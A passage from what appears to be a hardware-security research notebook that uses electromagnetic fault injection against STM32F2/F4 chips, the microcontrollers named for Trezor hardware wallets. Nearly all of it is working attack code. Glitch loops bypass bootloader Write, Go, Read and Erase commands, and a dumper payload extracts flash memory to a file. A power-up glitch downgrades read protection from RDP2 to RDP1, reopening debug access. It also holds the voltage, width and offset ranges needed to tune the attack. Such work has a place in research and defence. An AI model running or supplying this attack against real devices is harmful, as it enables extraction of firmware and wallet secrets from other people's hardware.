    addr = address.to_bytes(4, 'big')
    addr = addr + bytearray([checksum(addr)])

In [ ]:
# Handle command-specific configuration
if BL_COMMAND == "Write":
    filename = FILE   # Create a binary file or data that you want to write into the target
    with open(filename, 'rb') as f:
        payload = bytearray(f.read())     
    print("Payload size:", len(payload))    # Payload must be <= 256 bytes
       
    # Send the number of bytes to be written (1 byte), the data (N + 1 bytes), and the checksum
    # Data (N + 1) must be a multiple of 4
    while len(payload) % 4:
        payload.append(0xFF)
    
    payload = bytearray([len(payload)-1]) + payload
    payload = payload + bytearray([checksum(payload)])   # Prepare payload to write if successful
        
elif BL_COMMAND == "Go":
    pass
    
elif BL_COMMAND == "Read":
    nbytes = 256     # Number of bytes to read if successful (up to 256 bytes allowed)

elif BL_COMMAND == "Erase":
    # Embedded Flash Memory section 2.3.3 of RM0033 STM32F205xx Reference Manual or section 3.3 of RM0090 STM32F4xx Reference Manual
    pages = [3]    # List of sectors (pages) to erase if successful (Beware to not overwrite test code, which is in sector 0)

    data = (len(pages)-1).to_bytes(2, 'big')    # Number of pages to be erased
    for page in pages:
        data = data + page.to_bytes(2, 'big')   # Page codes
    data = data + bytearray([checksum(data)])

else:
    raise ValueError("Unsupported command.")

#### Core glitch loop

In [ ]:
# Initialize array to store results
expdata_bl = np.zeros((len(RESULT),(bl_glitch_voltage_end-bl_glitch_voltage_start)+1,(bl_glitch_width_end-bl_glitch_width_start)+1,(bl_glitch_offset_end-bl_glitch_offset_start)+1), dtype='uint32')
total = 0

In [ ]:
def generator():
    while True:
        yield

print(f"Attempting {DEVICE} Bootloader {BL_COMMAND} Glitch")
print(datetime.now())
print("Voltage range: %d, %d" % (bl_glitch_voltage_start, bl_glitch_voltage_end))
print("Width range: %d, %d" % (bl_glitch_width_start, bl_glitch_width_end))
print("Offset range: %d, %d" % (bl_glitch_offset_start, bl_glitch_offset_end))
print("CLKGEN freq: %d MHz" % (int(scope.clock.clkgen_freq / 1e6)))
print("Probe type: %s %s" % (PROBE_SIZE, PROBE_WINDING))
print(f"Tries per parameter set: {GLITCH_TRIES_BL}")

stop = False

#scope.trigger.module = 'ADC'
scope.trigger.module = 'SAD'
scope.SAD.reference = sad_bl_pattern

arm_cs(bl_glitch_voltage_start)

#for _ in tqdm(generator(), disable=True):
for _ in tqdm(generator()):
    if stop:
        break

    gvoltage = random.randint(bl_glitch_voltage_start, bl_glitch_voltage_end)
    gwidth = random.randint(bl_glitch_width_start, bl_glitch_width_end)
    goffset = random.randint(bl_glitch_offset_start, bl_glitch_offset_end)
    
    r = cs.trigger_safe   # Read ChipSHOUTER temperature sensors every so often to avoid fault
    cs.voltage = gvoltage
    scope.glitch.repeat = gwidth
    scope.glitch.ext_offset = goffset

    for tries in range(GLITCH_TRIES_BL):
        total += 1
        r = cs.trigger_safe

        scope.io.pdic = True            # Set BOOT0 HIGH to enter STM32 Serial Bootloader
        stm32_pwr_cycle(False)          # Power cycle target to recover if crashed
        reconnect()

        """
        try:
            bl_connect_retry()
        except ValueError:  # If we can't connect to the bootloader
            #downgrade()
            reprogram()
            try:
                bl_connect_retry()
            except ValueError:
                break
            #scope.trigger.module = 'ADC'
            scope.trigger.module = 'SAD'
            scope.SAD.reference = sad_bl_pattern
            scope.glitch.repeat = gwidth
            scope.glitch.ext_offset = goffset
            arm_cs(gvoltage)
        """
        
        ret = scope.scopetype.usart.read()
        send_bl_command(BL_COMMAND)

        time.sleep(0.05)
        if scope.capture(poll_done=True):  # If Husky didn't see the expected trigger
            #downgrade()
            reprogram()
            #scope.trigger.module = 'ADC'
            scope.trigger.module = 'SAD'
            scope.SAD.reference = sad_bl_pattern
            scope.glitch.repeat = gwidth
            scope.glitch.ext_offset = goffset
            arm_cs(gvoltage)
            break
        
        ret = scope.scopetype.usart.read()
            
        if len(ret) > 0:   # If bootloader response is not empty...
            if ret[0] != stbl.nack:   # If response if not NACK...
                if ret.hex() != '00' and b'Hello' not in ret:
                    print(gvoltage, gwidth, goffset, bytes(ret).hex())
                
                if ret[0] == stbl.ack:  # Successful glitch (1x ACK)
                    # Handle command-specific responses after the first successful ACK
                    if BL_COMMAND == "Write":
                        scope.scopetype.usart.write(addr)    # Send starting address to write (up to 256 bytes of data)
                        time.sleep(0.05)
                        r = scope.scopetype.usart.read(1)
                        
                        if len(r) > 0 and r[0] == stbl.ack:
                            scope.scopetype.usart.write(payload)    # Send payload
                            time.sleep(0.05)
                            r = scope.scopetype.usart.read(1)

                            if len(r) > 0 and r[0] == stbl.ack:
                                print('Fault 3x ACK!', gvoltage, gwidth, goffset)
                                expdata_bl[RESULT.FAULT, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
                                print("Write success!")
                                #stop = True
                                #break
                            else:
                                # crash
                                expdata_bl[RESULT.CRASH, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1

                        else:
                            # crash
                            expdata_bl[RESULT.CRASH, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
                               
                    elif BL_COMMAND == "Go":
                        scope.scopetype.usart.write(addr)    # Send address to jump to
                        time.sleep(0.05)
                        r = scope.scopetype.usart.read(1)
                        
                        if len(r) > 0 and r[0] == stbl.ack:
                            print('Fault 2x ACK!', gvoltage, gwidth, goffset)
                            expdata_bl[RESULT.FAULT, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
                            print("Go success!")

                            # Receive the memory contents from the dumper payload
                            cs.armed = False
                            dump = bytearray([])   # Prepare location for exfiltrated code
                            last_data_time = time.time()
                            while True:
                                if scope.scopetype.usart.inWaiting() > 0:
                                    dump += scope.scopetype.usart.read()
                                    last_data_time = time.time()              # Reset the timeout timer after successful reception
                                elif time.time() - last_data_time > 1:        # Exit the receive loop when timer has been exceeded
                                    break
            
                            dump = dump[1:]     # Ignore the first spurious byte
                            print(len(dump))    # Print total capture size
                            with open(f'./output/dump.bin', 'wb') as file:
                                file.write(dump)
                            #stop = True
                            #break
                        else:
                            # crash
                            expdata_bl[RESULT.CRASH, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
         
                    elif BL_COMMAND == "Read":
                        scope.scopetype.usart.write(addr)    # Send starting address to read
                        time.sleep(0.05)
                        r = scope.scopetype.usart.read(1)
                        
                        if len(r) > 0 and r[0] == stbl.ack:
                            scope.scopetype.usart.write(bytes([nbytes-1, checksum(nbytes-1)]))
                            ret = bytearray(scope.scopetype.usart.read(nbytes+1))

                            if len(ret) > 0 and ret[0] == stbl.ack:
                                print('Fault 3x ACK!', gvoltage, gwidth, goffset)
                                expdata_bl[RESULT.FAULT, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
                                #print("Read success! " + ret.hex(sep=' '))
                                #stop = True
                                #break
                            else:
                                # crash
                                expdata_bl[RESULT.CRASH, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1

                        else:
                            # crash
                            expdata_bl[RESULT.CRASH, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1

                    elif BL_COMMAND == "Erase":
                        scope.scopetype.usart.write(data)
                        time.sleep(0.05)

                        r = b""
                        last_data_time = time.time()
                        while True:
                            if scope.scopetype.usart.inWaiting() > 0:
                                r = scope.scopetype.usart.read(1)
                                break
                                
                            if time.time() - last_data_time > 10:   # Exit the receive loop when timer has been exceeded
                                break
                        
                        if len(r) > 0 and r[0] == stbl.ack:
                           print('Fault 2x ACK!', gvoltage, gwidth, goffset)
                           expdata_bl[RESULT.FAULT, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
                           print("Erase success!")
                           #stop = True
                           #break
                        else:
                           # crash
                           expdata_bl[RESULT.CRASH, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
                    
                    else:
                        raise ValueError("Unsupported command.")

                else:   # If response was something other than NACK or ACK... 
                    if ret[0] == 0x00:
                        # crash
                        expdata_bl[RESULT.CRASH, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
                    else:
                        # weird
                        expdata_bl[RESULT.WEIRD, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
                        
            else:   # ...otherwise, bootloader is behaving normally (e.g., NACK means command glitch was unsuccessful)
                # normal
                expdata_bl[RESULT.NORMAL, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
        
        else:   # ...otherwise, assume chip has crashed
            # crash
            expdata_bl[RESULT.CRASH, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1

        if total % 1000 == 0:
            print('# attempts:', total)
            print('# faults:', np.sum(expdata_bl[RESULT.FAULT,:,:,:]))
            print('# normal:', np.sum(expdata_bl[RESULT.NORMAL,:,:,:]))
            print('# crashes:', np.sum(expdata_bl[RESULT.CRASH,:,:,:]))
            print('# weirds:', np.sum(expdata_bl[RESULT.WEIRD,:,:,:]))
            #print('# perm downgrades:', np.sum(expdata_bl[RESULT.DOWNGRADE,:,:,:]))
            print('# wipes:', np.sum(expdata_bl[RESULT.WIPE,:,:,:]),'\n')

            # Save results
            np.save(f'./output/{DEVICE.lower()}_bl_{BL_COMMAND.lower()}_results_expdata.npy', expdata_bl)

        if (cs.faults_current):
            if SCAN_TYPE == "BL":
                # weird
                expdata[RESULT.WEIRD, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
            print(cs.faults_current)
            cs_reconnect()
            arm_cs(gvoltage)
                    
    # Detect if the target device was wiped while using the previous parameters
    reset_dut()
    r1 = scope.scopetype.usart.read()
    scope.scopetype.usart.write(b'D')
    time.sleep(0.05)
    r2 = scope.scopetype.usart.read()

    if (b'Hello' in r1) or (b'2500 50 50' in r2):
        continue
    else:
        print('Target device has been wiped!', gvoltage, gwidth, goffset)
        print(bytes(r1), bytes(r2))
        # wipe
        expdata_bl[RESULT.WIPE, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
        reprogram()   # Reload test code so the glitch loop can continue running properly
        #stop = True
        #break

    """ 
    # Detect if the target device was wiped or permanently downgraded while using the previous parameters
    r1, r2 = test_fw_read(0x1FFFC000)  # Read option bytes
    #print(r1, r2)
    if (b'Hello' not in r1) and len(r2) < 10:
        print('Target device has been wiped!', gvoltage, gwidth, goffset)
        print(bytes(r1), bytes(r2))
        # wipe
        expdata_bl[RESULT.WIPE, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1
        stop = True
        break  # Stop so we can verify if it's a true wipe
        #downgrade()
        #reprogram_rdp2()
    elif 'cc' not in r2.hex():
        print('Permanent downgrade!', gvoltage, gwidth, goffset)
        print(bytes(r1), bytes(r2))
        # permanent downgrade
        expdata_bl[RESULT.DOWNGRADE, gvoltage-bl_glitch_voltage_start, gwidth-bl_glitch_width_start, goffset-bl_glitch_offset_start] += 1        
        reprogram_rdp2()
    """
        
print("\nDone!")
print(datetime.now())
scope.io.nrst = 'high_z'
cs.armed = False    # Disarm ChipSHOUTER

In [ ]:
# Display summary
print('# attempts:', total)
print('# faults:', np.sum(expdata_bl[RESULT.FAULT,:,:,:]))
print('# normal:', np.sum(expdata_bl[RESULT.NORMAL,:,:,:]))
print('# crashes:', np.sum(expdata_bl[RESULT.CRASH,:,:,:]))
print('# weirds:', np.sum(expdata_bl[RESULT.WEIRD,:,:,:]))
#print('# perm downgrades:', np.sum(expdata_bl[RESULT.DOWNGRADE,:,:,:]))
print('# wipes:', np.sum(expdata_bl[RESULT.WIPE,:,:,:]),'\n')

In [ ]:
# Save results (optional)
np.save(f'./output/{DEVICE.lower()}_bl_{BL_COMMAND.lower()}_results_expdata.npy', expdata_bl)

In [ ]:
# Load results (optional)
expdata_bl = np.load(f'./output/{DEVICE.lower()}_bl_{BL_COMMAND.lower()}_results_expdata.npy')

### Data Analysis

#### Heatmap (multiple parameter)

In [ ]:
vmax = 5 #GLITCH_TRIES_BL    # Clip to the highest intensity color
#cmap = 'viridis'
#cmap = 'plasma'
cmap = 'hot'

glitch_plot_heatmap(expdata_bl, RESULT.NORMAL, vmax, cmap, f'{DEVICE} BL {BL_COMMAND} Glitch', bl_glitch_voltage_start, bl_glitch_voltage_end, bl_glitch_offset_start, bl_glitch_offset_end)
glitch_plot_heatmap(expdata_bl, RESULT.FAULT, vmax, cmap, f'{DEVICE} BL {BL_COMMAND} Glitch', bl_glitch_voltage_start, bl_glitch_voltage_end, bl_glitch_offset_start, bl_glitch_offset_end)
glitch_plot_heatmap(expdata_bl, RESULT.WIPE, vmax, cmap, f'{DEVICE} BL {BL_COMMAND} Glitch', bl_glitch_voltage_start, bl_glitch_voltage_end, bl_glitch_offset_start, bl_glitch_offset_end)
#glitch_plot_heatmap(expdata_bl, RESULT.DOWNGRADE, vmax, cmap, f'{DEVICE} BL {BL_COMMAND} Glitch', bl_glitch_voltage_start, bl_glitch_voltage_end, bl_glitch_offset_start, bl_glitch_offset_end)

#### Line plot (multiple parameter)

In [ ]:
glitch_plot_line(expdata_bl, "Voltage", RESULT.FAULT, RESULT.WIPE, f'{DEVICE} BL {BL_COMMAND} Glitch')
glitch_plot_line(expdata_bl, "Width", RESULT.FAULT, RESULT.WIPE, f'{DEVICE} BL {BL_COMMAND} Glitch')
glitch_plot_line(expdata_bl, "Offset", RESULT.FAULT, RESULT.WIPE, f'{DEVICE} BL {BL_COMMAND} Glitch')

#### Bar plot (single parameter)

In [ ]:
glitch_plot_bar(expdata_bl, "Voltage", RESULT.FAULT, f'{DEVICE} BL {BL_COMMAND} Glitch')
glitch_plot_bar(expdata_bl, "Width", RESULT.FAULT, f'{DEVICE} BL {BL_COMMAND} Glitch')
glitch_plot_bar(expdata_bl, "Offset", RESULT.FAULT, f'{DEVICE} BL {BL_COMMAND} Glitch')

glitch_plot_bar(expdata_bl, "Voltage", RESULT.WIPE, f'{DEVICE} BL {BL_COMMAND} Glitch')
glitch_plot_bar(expdata_bl, "Width", RESULT.WIPE, f'{DEVICE} BL {BL_COMMAND} Glitch')
glitch_plot_bar(expdata_bl, "Offset", RESULT.WIPE, f'{DEVICE} BL {BL_COMMAND} Glitch')

## RDP2 -> RDP1 Downgrade

With successful fault injection of the STM32 during power-up, RDP2 will be downgraded to RDP1. This enables JTAG/SWD, bootloader, and access to RAM.

### Enable RDP Level 2 (USE WITH CAUTION)

Configure Option Bytes accordingly in order to enable Read Protection (RDP)

* 0xAA: Level 0, no protection
* 0xCC: Level 2, chip protection (debug and boot from RAM features disabled)
* Others: Level 1, read protection of memories (debug features limited)

Trezor Model One (STM32F205): Table 7 of PM0059 STM32F2xx Flash Programming Manual  
Trezor Model T (STM32F427): Table 17 of RM0090 STM32F4xx Reference Manual

In [ ]:
# RDP = 0xCC (Level 2)
# User Option Byte = 0xEF = 0b11101111
# Bit 7: nRST_STDBY = 1 (No reset generated)
# Bit 6: nRST_STOP = 1 (No reset generated)
# Bit 5: WDG_SW = 1 (Software watchdog)
# Bit 4: BFB2 = 0 (Boot depending on BOOT pin state for STM32F427, unused for STM32F205)
# Bit 3:2: BOR_LEV = 11 (Brown out reset disabled)
# Bit 1:0: Not used = 11

option_bytes_level2 = bytearray.fromhex('EFCC1033')
reconnect()
stbl.write_memory(0x1FFFC000, option_bytes_level2)

In [ ]:
stm32_pwr_cycle(False)     # Power cycle target

In [ ]:
# If RDP2 is successfully enabled, we should not be able to connect to the serial bootloader anymore
reconnect()

### Characterization

In [ ]:
def sca_measurement_loop_rdp():  
    scope.io.target_pwr = True        # Power on target via CW +3.3V
    time.sleep(0.5)
    
    ntraces = 10
    traces = np.zeros((ntraces, scope.adc.samples), dtype='uint8')
    
    for i in tqdm(range(ntraces)):
        stm32_pwr_cycle(True)                            # Power cycle target and arm ChipWhisperer
        scope.capture(poll_done=True)                    # Capture trace
        traces[i] = scope.get_last_trace(as_int=True)    # Store captured trace into array
        
    scope.io.target_pwr = False       # Power off target via CW +3.3V

    return traces

#### nRST trigger

In [ ]:
# ChipWhisperer SCA parameters for reference capture
cw_init()

scope.trigger.module = "basic"        # Trigger on a logic level or edge
scope.trigger.triggers = "nrst"       # Trigger on nRST

scope.gain.db = 32
scope.adc.bits_per_sample = 8
scope.adc.offset = 0                  # Number of samples to skip before recording data after trigger event
scope.adc.presamples = 0              # Number of samples to record from before the trigger event

scope.adc.samples = 40000         # Number of ADC samples to record in a single capture (maximum 131070)
"""
if DEVICE.startswith("STM32F2"):
    scope.adc.samples = 40000         # Number of ADC samples to record in a single capture (maximum 131070)

elif DEVICE.startswith("STM32F4"):
    scope.adc.samples = 80000         # Number of ADC samples to record in a single capture (maximum 131070)
"""

In [ ]:
traces_nrst = sca_measurement_loop_rdp()

In [ ]:
sca_plot_traces(traces_nrst, title = f"{DEVICE} Downgrade Reference Trace (NRST Trigger)", mean_only = False)

In [ ]:
# Save traces (optional)
np.save(f'./output/{DEVICE.lower()}_rdp_reference_sca_nrst.npy', traces_nrst)

In [ ]:
# Load traces (optional)
traces_nrst = np.load(f'./output/{DEVICE.lower()}_rdp_reference_sca_nrst.npy')

#### SAD trigger

In [ ]:
# Configure ChipWhisperer SAD (Sum of Absolute Differences)
cw_init()

SAD_TRACE_OFFSET = X     # Start of reference trace, value needs to be determined through characterization

sad_downgrade_pattern = traces_nrst[0][SAD_TRACE_OFFSET:SAD_TRACE_OFFSET+200]

scope.trigger.module = 'SAD'
scope.SAD.reference = sad_downgrade_pattern
scope.SAD.interval_threshold = 40
scope.SAD.threshold = 60
scope.SAD.multiple_triggers = False
scope.SAD.emode = False

scope.gain.db = 32
scope.adc.bits_per_sample = 8
scope.adc.offset = 0                 # Number of samples to skip before recording data after trigger event
scope.adc.presamples = 500           # Number of samples to record from before the trigger event

if DEVICE.startswith("STM32F2"):
    scope.adc.samples = 1750         # Number of ADC samples to record in a single capture (maximum 131070)

elif DEVICE.startswith("STM32F4"):
    scope.adc.samples = 2500         # Number of ADC samples to record in a single capture (maximum 131070)

In [ ]:
traces_sad = sca_measurement_loop_rdp()

In [ ]:
sca_plot_traces(traces_sad, title = f"{DEVICE} Downgrade Reference Trace (SAD Trigger)", mean_only = False)

#### Configuration

In [ ]:
def downgrade():
    scope.trigger.module = 'SAD'
    scope.SAD.reference = sad_downgrade_pattern

    scope.glitch.ext_offset = downgrade_offset
    scope.glitch.repeat = downgrade_width

    arm_cs(downgrade_voltage)
    
    scope.io.nrst = 'high_z'

    #for i in range(100):
    for i in tqdm(range(100), desc=f"Attempting downgrade at {downgrade_voltage}V"):
        r = cs.trigger_safe            
        scope.io.pdic = True            # Set BOOT0 HIGH to enter STM32 Serial Bootloader
        stm32_pwr_cycle(True)           # Power cycle target and arm ChipWhisperer
        scope.capture(poll_done=True)   # Capture trace
        time.sleep(0.05)                # Allow target time to initialize

        """
        idc = scope.jtag_idcode()
        if idc != 'ffffffff':
            break
        """
        
        try:
            reconnect()

        except:
            continue

        else:
            print(f"Successful downgrade using {downgrade_voltage}V at offset {downgrade_offset}")
            break
    
    cs.armed = False

In [ ]:
# Glitch characterization: Number of tries per parameter set
GLITCH_TRIES_RDP = 10

In [ ]:
scope.io.glitch_trig_mcx = 'glitch'
scope.glitch.repeat = 9

In [ ]:
# Customized parameters
if DEVICE.startswith("STM32F2"):  # 100MHz
    glitch_voltage_start = 400
    glitch_voltage_end = 500
    
    glitch_width_start = 10
    glitch_width_end = 10
    
    glitch_offset_start = 0
    glitch_offset_end = 200

elif DEVICE.startswith("STM32F4"):  # 200MHz
    glitch_voltage_start = 300
    glitch_voltage_end = 500
    
    glitch_width_start = 22
    glitch_width_end = 40
    
    glitch_offset_start = 0
    glitch_offset_end = 400

#### Core glitch loop

In [ ]:
# Initialize array to store results
expdata_rdp = np.zeros((len(RESULT),(glitch_voltage_end-glitch_voltage_start)+1,(glitch_width_end-glitch_width_start)+1,(glitch_offset_end-glitch_offset_start)+1), dtype='uint32')
total = 0

if DEVICE.startswith("STM32F4"):
    pcrop_default = test_pcrop_read()
    print(pcrop_default)

In [ ]:
print(f"Attempting {DEVICE} RDP2 -> RDP1 Downgrade Glitch")
print(datetime.now())
print("Voltage range: %d, %d" % (glitch_voltage_start, glitch_voltage_end))
print("Width range: %d, %d" % (glitch_width_start, glitch_width_end))
print("Offset range: %d, %d" % (glitch_offset_start, glitch_offset_end))
print("CLKGEN freq: %d MHz" % (int(scope.clock.clkgen_freq / 1e6)))
print("Probe type: %s %s" % (PROBE_SIZE, PROBE_WINDING))
print(f"Tries per parameter set: {GLITCH_TRIES_RDP}\n")

def generator():
    while True:
        yield

stop = False

scope.trigger.module = 'SAD'
scope.SAD.reference = sad_downgrade_pattern

arm_cs(glitch_voltage_start)

for _ in tqdm(generator(), disable=True):
#for _ in tqdm(generator()):
    if stop:
        break

    gvoltage = random.randint(glitch_voltage_start, glitch_voltage_end)
    gwidth = random.randint(glitch_width_start, glitch_width_end)
    goffset = random.randint(glitch_offset_start, glitch_offset_end)
    
    r = cs.trigger_safe   # Read ChipSHOUTER temperature sensors every so often to avoid fault
    cs.voltage = gvoltage
    scope.glitch.repeat = gwidth
    scope.glitch.ext_offset = goffset
 
    for tries in range(GLITCH_TRIES_RDP):
        try:
            total += 1
            #r = cs.trigger_safe

            scope.io.pdic = True            # Set BOOT0 HIGH to enter STM32 Serial Bootloader
            stm32_pwr_cycle(True)           # Power cycle target and arm ChipWhisperer
            scope.capture(poll_done=True)   # Capture trace
            time.sleep(0.05)                # Allow target time to initialize

            """
            # STM32 Serial Bootloader
            try:
                reconnect()
            
            except Exception as e:
                #print(e)
                expdata_rdp[RESULT.NORMAL, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start] += 1
            
            else:
                print(f"Glitch! Voltage: {gvoltage}, Width: {gwidth}, Offset: {goffset}")
                a, b, c = stbl.get_version()
                print('Version: 0x%02x, option 1: %d, option 2: %d' %(a,b,c))
                expdata_rdp[RESULT.FAULT, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start] += 1
                downgrade_voltage = gvoltage
                downgrade_offset = goffset
                downgrade_width = gwidth
                #stop = True
                #break
            """
            
            # JTAG IDCODE
            id = pylink_idcode()   # Attempt to read JTAG IDCODE
            if (id != '0xffffffff' and id != '0x0'):
                #print(datetime.now())
                print(f"Glitch! Voltage: {gvoltage}, Width: {gwidth}, Offset: {goffset},", id, end="")
                #print(f"Glitch! Voltage: {gvoltage}, Width: {gwidth}, Offset: {goffset}")
                #print("JTAG IDCODE: " + id, end="\r\n")

                try:
                    # It's possible to successfully downgrade, but not have access to the STM32 Serial Bootloader
                    # Attempt to connect to the bootloader to verify
                    reconnect()
                    a, b, c = stbl.get_version()
                    #print('Version: 0x%02x, option 1: %d, option 2: %d' %(a,b,c))

                    if DEVICE.startswith("STM32F4"):
                        pcrop = test_pcrop_read(False)
                        #print(pcrop)
                        
                        if (b'Hello' in pcrop[0]):
                            expdata_rdp[RESULT.FAULT, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start] += 1
                        else:
                            expdata_rdp[RESULT.WEIRD, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start] += 1
                        
                        jlink.set_tif(pylink.enums.JLinkInterfaces.SWD)    # Set Target Interface as SWD
                        jlink.connect('STM32F427VG')                       # Connect to STM32
                        #print("SWD IDCODE: " + hex(jlink.core_id()))       # Confirm that we are successfully connected
                        print(", ", end="")
                        print(f"FLASH_OPTCR: 0x{jlink.memory_read32(0x40023C14, 1)[0]:08x}", end="")                                
                        #print(f"FLASH_OPTCR1: 0x{jlink.memory_read32(0x40023C18, 1)[0]:08x}")

                    else:
                        expdata_rdp[RESULT.FAULT, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start] += 1

                    downgrade_voltage = gvoltage
                    downgrade_offset = goffset
                    downgrade_width = gwidth
    
                    #stop = True
                    #break
                        
                except Exception:
                    if DEVICE.startswith("STM32F2"):  # Downgrade, but no BL
                        expdata_rdp[RESULT.WEIRD, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start] += 1
                    pass

                print()
                
            else:
                expdata_rdp[RESULT.NORMAL, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start] += 1
            
        except Exception as message:
            message = str(message)
            print(message)
            pass
            
        except KeyboardInterrupt:
            stop = True
            break

        if total % 10000 == 0:
            print('# attempts:', total)
            print('# faults:', np.sum(expdata_rdp[RESULT.FAULT,:,:,:]))
            print('# faults no run:', np.sum(expdata_rdp[RESULT.WEIRD,:,:,:]))
            print('# normal:', np.sum(expdata_rdp[RESULT.NORMAL,:,:,:]))
            print('# wipes:', np.sum(expdata_rdp[RESULT.WIPE,:,:,:]))

            if DEVICE.startswith("STM32F4"):
                print('# pcrop perm:', np.sum(expdata_rdp[RESULT.PCROP,:,:,:]))
            print()
            
            # Save results
            np.save(f'./output/{DEVICE.lower()}_rdp_results_expdata.npy', expdata_rdp)

        if (cs.faults_current):
            print(cs.faults_current)
            cs_reconnect()
            arm_cs(gvoltage)
    """
    if DEVICE.startswith("STM32F4"):
        # Detect if the target device was wiped or PCROP-specific values permanently corrupted while using the previous parameters
        pcrop = test_pcrop_read()  # Includes power cycle
        
        if pcrop != pcrop_default:
            if (b'Hello' not in pcrop[0]) and pcrop[1] != 16:
                print('Target device has been wiped!', gvoltage, gwidth, goffset)
                print(pcrop)
                # wipe
                expdata_rdp[RESULT.WIPE, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start] += 1
                #stop = True
                #break  # Stop so we can verify if it's a true wipe
                downgrade()
                reprogram_rdp2()
                pcrop_default = test_pcrop_read()

                #elif pcrop[-4:] != pcrop_default[-4:]: # If the last 4 elements are different (option bytes, FLASH_OPTCR registers)
                #    print('PCROP corrupted!', gvoltage, gwidth, goffset, x_coord, y_coord)
                #    print(pcrop)
                #    print(pcrop_default)
                #    # pcrop
                #    expdata[RESULT.PCROP, gvoltage-glitch_voltage_start, gwidth-glitch_width_start, goffset-glitch_offset_start, round(x_coord/CNC_STEP), round(y_coord/CNC_STEP)] += 1
                #    #stop = True
                #    #break
                #    #downgrade()
                #    #reprogram_rdp2()
                #    pcrop_default = test_pcrop_read()           

            elif 'cc' not in pcrop[4]:
                print('Permanent downgrade!', gvoltage, gwidth, goffset)
                stop = True
                break
    """
print("\nDone!")
print(datetime.now())
scope.io.nrst = 'high_z'
cs.armed = False    # Disarm ChipSHOUTER

In [ ]:
# Post-stress test check for wipe or option byte corruption (most importantly permanent downgrade or PCROP)
print(pcrop_default)

pcrop = test_pcrop_read()
print(pcrop)

if (b'Hello' not in pcrop[0]) and pcrop[1] != 16:
    print('Wipe!')
    
elif 'cc' not in pcrop[4]:
    print('Permanent downgrade!')

In [ ]:
# Display summary
print('# attempts:', total)
print('# faults:', np.sum(expdata_rdp[RESULT.FAULT,:,:,:]))
print('# faults no run:', np.sum(expdata_rdp[RESULT.WEIRD,:,:,:]))
print('# normal:', np.sum(expdata_rdp[RESULT.NORMAL,:,:,:]))
print('# wipes:', np.sum(expdata_rdp[RESULT.WIPE,:,:,:]))

if DEVICE.startswith("STM32F4"):
    print('# pcrop perm:', np.sum(expdata_rdp[RESULT.PCROP,:,:,:]))

In [ ]:
# Save results (optional)
np.save(f'./output/{DEVICE.lower()}_rdp_results_expdata.npy', expdata_rdp)

In [ ]:
# Load results (optional)
expdata_rdp = np.load(f'./output/{DEVICE.lower()}_rdp_results_expdata.npy')

### Data Analysis

#### Heatmap (multiple parameter)

In [ ]:
vmax = GLITCH_TRIES_RDP    # Clip to the highest intensity color
#cmap = 'viridis'
#cmap = 'plasma'
cmap = 'hot'

glitch_plot_heatmap(expdata_rdp, RESULT.FAULT, vmax, cmap, f'{DEVICE} RDP Downgrade', glitch_voltage_start, glitch_voltage_end, glitch_offset_start, glitch_offset_end)
glitch_plot_heatmap(expdata_rdp, RESULT.WEIRD, vmax, cmap, f'{DEVICE} RDP Downgrade No Run', glitch_voltage_start, glitch_voltage_end, glitch_offset_start, glitch_offset_end)
glitch_plot_heatmap(expdata_rdp, RESULT.WIPE, vmax, cmap, f'{DEVICE} RDP Downgrade', glitch_voltage_start, glitch_voltage_end, glitch_offset_start, glitch_offset_end)

#### Line plot (multiple parameter)

In [ ]:
glitch_plot_line(expdata_rdp, "Voltage", RESULT.FAULT, RESULT.WEIRD, f'{DEVICE} RDP Downgrade')
#glitch_plot_line(expdata_rdp, "Width", RESULT.FAULT, RESULT.WEIRD, f'{DEVICE} RDP Downgrade')
glitch_plot_line(expdata_rdp, "Offset", RESULT.FAULT, RESULT.WEIRD, f'{DEVICE} RDP Downgrade')

#### Bar plot (single parameter)

In [ ]:
glitch_plot_bar(expdata_rdp, "Voltage", RESULT.WIPE, f'{DEVICE} RDP Downgrade')
#glitch_plot_bar(expdata_rdp, "Width", RESULT.FAULT, f'{DEVICE} RDP Downgrade')
glitch_plot_bar(expdata_rdp, "Offset", RESULT.WIPE, f'{DEVICE} RDP Downgrade')

## Clean up

In [ ]:
cnc_send_command("G1 X0 Y0 Z0 F100")       # Return to zero (optional)

In [ ]:
cs.armed = False                  # Disarm ChipSHOUTER
